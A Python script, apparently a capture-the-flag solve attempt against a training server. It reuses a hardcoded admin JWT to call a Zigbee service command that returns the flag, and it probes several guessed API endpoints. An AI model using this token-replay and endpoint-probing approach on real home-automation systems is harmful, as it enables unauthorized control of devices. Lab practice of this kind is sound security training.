#!/usr/bin/env python3
import requests
import json

# Token obtenido del login
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJvd25lciIsIm5hbWUiOiJBZG1pbiIsImlhdCI6MTc3ODc3Mzg2NywiZXhwIjoxNzc4ODAyNjY3fQ.zIn7IaxtnY9b8HJyWWwS15PZ4G7SaZyQMgmoTzuXPoE"
base_url = "http://training-pod2.ctfchile.com:32780"

headers = {
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json"
}

# Basado en el audit log, el comando usado es:
# zha.issue_zigbee_cluster_command con:
# - ieee: 00:12:4B:00:24:AA:10:01 (coordinador)
# - cluster_id: 257
# - cmd: get_flag

# Primero probemos si hay un endpoint de servicios
try:
    # Intentar obtener servicios disponibles
    resp = requests.get(f"{base_url}/api/v2/services", headers=headers)
    print(f"[*] Services API status: {resp.status_code}")
    if resp.status_code == 200:
        services = resp.json()
        print(f"[*] Available services: {list(services.keys()) if isinstance(services, dict) else 'List format'}")

    # Intentar llamar el servicio ZHA directamente
    service_data = {
        "service": "zha.issue_zigbee_cluster_command",
        "data": {
            "ieee": "00:12:4B:00:24:AA:10:01",
            "nwk_address": "0x0000",
            "cluster_id": 257,
            "cmd": "get_flag"
        }
    }

    print(f"\n[*] Attempting service call: {json.dumps(service_data, indent=2)}")
    resp = requests.post(f"{base_url}/api/v2/services/call", headers=headers, json=service_data)
    print(f"[*] Service call response: {resp.status_code} - {resp.text}")

    # También probemos el endpoint directo de ZHA
    zha_data = {
        "ieee": "00:12:4B:00:24:AA:10:01",
        "nwk_address": "0x0000",
        "cluster_id": 257,
        "cmd": "get_flag"
    }

    print(f"\n[*] Attempting ZHA direct call: {json.dumps(zha_data, indent=2)}")
    resp = requests.post(f"{base_url}/api/v2/zigbee/command", headers=headers, json=zha_data)
    print(f"[*] ZHA command response: {resp.status_code} - {resp.text}")

    # Probar otros posibles endpoints
    endpoints_to_try = [
        "/api/v2/zha/issue_zigbee_cluster_command",
        "/api/v2/coordinator/command",
        "/api/v2/zigbee/cluster/command"
    ]

    for endpoint in endpoints_to_try:
        print(f"\n[*] Trying endpoint: {endpoint}")
        resp = requests.post(f"{base_url}{endpoint}", headers=headers, json=zha_data)
        print(f"[*] Response: {resp.status_code} - {resp.text}")

except Exception as e:
    print(f"[-] Error: {e}")